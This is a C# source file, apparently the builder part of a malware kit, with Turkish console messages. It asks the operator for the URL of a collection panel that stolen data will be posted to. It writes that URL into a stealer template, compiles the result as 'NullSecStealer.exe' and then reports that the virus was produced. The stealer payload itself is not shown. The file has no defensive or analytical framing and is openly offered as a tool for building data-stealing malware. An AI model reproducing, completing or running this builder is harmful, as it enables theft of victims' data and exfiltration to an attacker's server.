using System;
using System.IO;
using Microsoft.CSharp;
using System.CodeDom.Compiler;

class Builder
{
    static void Main()
    {
        Console.Write("Veri gönderilecek site URL'sini gir (örn: https://seninpanelin.site/post.php): ");
        string url = Console.ReadLine();

        string template = File.ReadAllText("template.cs");
        template = template.Replace("{{SERVER_URL}}", url);

        string tempSource = "temp_build.cs";
        File.WriteAllText(tempSource, template);

        CSharpCodeProvider provider = new CSharpCodeProvider();
        CompilerParameters parameters = new CompilerParameters();
        parameters.GenerateExecutable = true;
        parameters.OutputAssembly = "NullSecStealer.exe";
        parameters.ReferencedAssemblies.Add("System.dll");
        parameters.ReferencedAssemblies.Add("System.Net.Http.dll");
        parameters.ReferencedAssemblies.Add("System.Drawing.dll");
        parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
        parameters.ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll");

        CompilerResults results = provider.CompileAssemblyFromSource(parameters, template);

        if (results.Errors.HasErrors)
        {
            Console.WriteLine("Derleme hataları:");
            foreach (CompilerError error in results.Errors)
                Console.WriteLine(error.ToString());
        }
        else
        {
            Console.WriteLine("✅ Virüs başarıyla üretildi: NullSecStealer.exe");
        }

        File.Delete(tempSource);
    }
}
